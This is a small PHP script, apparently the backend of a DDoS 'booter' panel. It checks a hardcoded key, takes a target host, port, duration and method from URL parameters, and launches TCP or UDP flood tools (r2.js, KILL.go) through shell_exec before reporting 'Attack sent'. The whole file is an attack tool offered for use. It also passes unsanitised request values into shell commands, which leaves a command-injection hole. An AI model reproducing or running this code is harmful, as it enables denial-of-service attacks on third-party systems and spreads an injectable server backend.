<?php
// Coded by Sword

$key = $_GET['key'];
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];

if ($key == "haibedz") {
    if ($host == null) { echo "Please enter a host"; }
    elseif ($port == null) { echo "Please enter a port"; }
    elseif ($time == null) { echo "Please enter a time"; }
    elseif ($method == null) { echo "Please enter a method"; }
    else {
        if ($method == "TCP") {
            shell_exec("node r2.js $host $port 99 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        if ($method == "UDP") { 
            shell_exec("go run KILL.go $host $port $time payload=random size=1024");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
    }
}
else { 
    echo "Key invalid !";
}


?>